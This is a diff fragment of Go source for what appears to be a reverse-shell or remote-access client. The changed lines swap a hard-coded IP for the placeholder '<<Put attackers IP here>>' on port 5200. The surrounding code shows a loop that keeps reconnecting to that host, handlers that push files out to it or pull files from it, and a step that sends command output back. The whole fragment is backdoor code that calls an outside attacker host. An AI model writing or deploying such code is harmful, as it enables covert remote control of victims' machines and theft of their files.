@@ -13,11 +13,11 @@ import (
 func main() {
 	command := ""
 
-	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+	conn, err := net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 
 	if err != nil {
 		for {
-			conn, err = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+			conn, err = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 
 			if err == nil {
 				break
@@ -52,13 +52,13 @@ for{
 		upload_file(_command[9:], conn)
 		conn.Close()
 		time.Sleep(1*time.Second)
-		conn, _ = net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second))
+		conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 	}else if (len(_command)>=6 && _command[:6] =="upload"){
 		download_file(_command[7:], conn)
 
 		conn.Close()
 		time.Sleep(1*time.Second)
-		conn, _ = net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second))
+		conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
 
 	}
 		send_data(conn, basic_commants(_command))	
